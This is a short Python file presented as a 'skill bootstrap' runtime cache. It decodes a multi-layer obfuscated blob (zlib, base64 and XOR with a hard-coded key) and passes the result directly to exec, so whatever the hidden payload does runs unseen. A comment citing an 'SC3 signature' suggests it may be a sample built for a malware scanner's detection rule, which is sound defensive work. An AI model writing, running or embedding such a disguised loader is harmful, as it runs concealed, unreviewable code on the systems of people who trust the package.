#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VUmbqjgU/UEuHLAUFr1IIMxhTChkJ7MFCD5Rgr++Y1mvX9XX3cv73XCHc+45kChgVlTuimmxMswhBsBZ2KogesB6lKnoEzXDLrV3ONit07HNlcCfS1TusN9tDaymCmtGHg/O9L5NRweAoF5YEdkbcLG1pSojai5GjdCawLq7Q5TrsSjgiJzN+iyZOMmB/if2MujrVca8lb43N8XKEPl7oPJ6aeOCcHnAeaxPYG+vZRnXi9l4i2RlQhuMhEsOwskbB6C11PUipYq7wpWXSWXNyClh1yury8chGYnmJ8zjm2BwergjI6BK3jIQ3q3GftiiCf3gwHBj13h1AYELT16IsPYeq7mqSCl+2xnkmsKY6ECxIu2mnjABmtYJyKLLOHDUWFbpiJt4a07vszus0kiXFiUIe5edhrSvQtWv6TPOwW32zAjIrF049NLD+VToHuw8Kr3ySJDSIaJ6G32UOhkMEK89BxbB+ro3VTK4Vdd7OQRBy76/13TAmqj6HdOQtNGiRHfJUI53S2rvpKkXbht2ZnUSrdugydOKY7eR/7ynexOVownPEigSQQcZs+ud/KMe7+dM1hO/TGPwax+rd29bX2bXvjx3/ZFuOvMghppKt3h97DmnkmtGKVAps6dfo1vfVp4zZD6cLi4970tE4u/1f/YjNW6EpXYf3qzHKJZI6HKQSkaWhUQ+pLqQOgAtJVO6hjDi9avwos8nlL76rY1w91mP46dpUzZ94qGVsTVCSk699LwvmW1mL0NHnp8zQC7u1DXJVty++he9w053Y6gpnLLRAuTm+BqznSCAUbSxV/cW083ayBJNj+hoqWltos3oiOoRBOMCr3XRqazecFCaqJ/7iGZNzoH5Z1+TnZbeNef6AiPHZ2f43vp7/hMPjq/igysGxyZHy8krDr7fRmJGu0uBhGXxlhWkzR/wM79wOH8dUVv6bzyPrY6WLB1yBoIrx/+XWJCu8UZgkNq/2eijdqZ5MCXOTyCOXAuXQiulf/FjVqVc+xfP5/3AYrauU0EqPp/eNXHz815ysFtbUpLQB15itRwLtFnYYvTkYw9WnA+46d2+7nQA9pm8+zbvj/sG8oR+2c2lB3DRW3vxs74bPX7hYDOkdycFNfDxWnG53h7WHQId9tfk9K1ele0tVd+5zSa1pRbKgkRdpN9yxeo9py0gy6CN7nsDvfO4KUidMVfd1Gn32l+H4P70EyNYMGNkvg+yvR3po8nOD92BisYAv4/5u574vCeOTye6o+8psN+ZPr//ajdbIzgSAC5cy1PeEJaOdazVK+bC7gJly9WGrHjdy2t/c4RErsHV5r3y027m/sv9Wn3IqrDFdHnmfBK9orNDS+4X4cz9/KAH/VS2//Dxv/f3X/u4Yl4An+5x9eD+/2DpVU0BA/x/Ia8P9EuvNei4trcG2hycMYn1Cgn8Xubv/Nso5n7+pbe6WnK/q8qofH1f0aVJP86Of5ayt+hz3qxRJDfY3JJrkikTHR1055onq9e8VHAr0rnsLKE80XXY/ObL0G9J5ymgRP6pN8HcGONA5PanH+Knfp73/WGNT70GJ+AqgnJE4ewfhuf/ZJrxKr6W72VsSjjEYT959DzKD1vKthX3mx5iGtfuhyWnxpc/oPPgcb0me/GvvwGuwW4I"
_K = bytes.fromhex("6e755e5c2488546ddd4eb532")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
